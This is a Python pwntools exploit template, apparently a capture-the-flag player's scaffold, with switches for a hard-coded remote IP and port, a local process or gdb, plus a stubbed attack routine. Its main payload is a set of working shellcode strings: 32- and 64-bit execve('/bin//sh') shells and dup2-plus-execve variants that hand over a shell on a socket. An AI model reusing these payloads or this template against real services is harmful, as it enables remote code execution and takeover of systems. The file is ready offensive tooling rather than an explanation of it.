#!/home/miyagaw61/.pyenv/shims/python
from pwn import *
from enert import *
from pwnlib.util.cyclic import *

# =================
# OCCASIONAL CHANGE
# =================
context(os="linux", arch="")
BINARY = ""
#R_LIBC = ""
R_HOST = "178.62.249.106"
R_PORT = 8642

# =========================
# TEMPLATE FOR EXPLOITATION
# =========================
context.log_level = "debug" # output verbose log
L_LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
L_HOST = "localhost"
L_PORT = 4444
elf    = ELF(BINARY)
s      = None
if len(sys.argv) > 1 and sys.argv[1] == "r":
    s = remote(R_HOST, R_PORT)
    #libc = ELF(R_LIBC)
elif len(sys.argv) > 1 and sys.argv[1] == "l":
    s = process(elf)
    libc = ELF(L_LIBC)
else:
    s = remote(L_HOST, L_PORT)
    libc = ELF(L_LIBC)

if len(sys.argv) > 1 and sys.argv[1] == "d":
    s = remote(L_HOST, L_PORT)
    f = open("gdbrc", "r")
    time.sleep(0.5)
    pid = proc.pid_by_name(BINARY)
    gdb.attach(pid[0], f)

def inf(strings, color="green"):
    term_y, term_x = get_term_size()
    if color == "green":
        print(green("\n" + "="*term_x, "bold"))
        print("[" + red("+", "bold") + "]" + strings)
        print(green("="*term_x + "\n", "bold"))
    if color == "red":
        print(red("\n" + "="*term_x, "bold"))
        print("[" + red("+", "bold") + "]" + strings)
        print(red("="*term_x + "\n", "bold"))
    if color == "blue":
        print(blue("\n" + "="*term_x, "bold"))
        print("[" + red("+", "bold") + "]" + strings)
        print(blue("="*term_x + "\n", "bold"))

sc_execve32_short = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" #21
sc_execve32       = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" #24
sc_execve32       = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80" #24
sc_dup2execve32   = "\x31\xd2\x31\xc9\x8d\x5a\x04\x8d\x42\x3f\xcd\x80\x41\x8d\x42\x3f\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80" #42
sc_execve64_short = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05" #23
sc_execve64       = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05" #29
sc_dup2execve64   = "\x31\xd2\x31\xf6\x67\x8d\x7a\x04\x67\x8d\x42\x21\x0f\x05\xff\xc6\x67\x8d\x42\x21\x0f\x05\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05" #51

# ========================================
# VALIABLES AND FUNCTIONS FOR EXPLOITATION
# ========================================
bss = elf.bss()+0x800
def attack():
    s.recvuntil(":")
    s.sendline("A")

# =========================
# MAIN EXPLOITATION ROUTINE
# =========================
attack()
s.interactive()
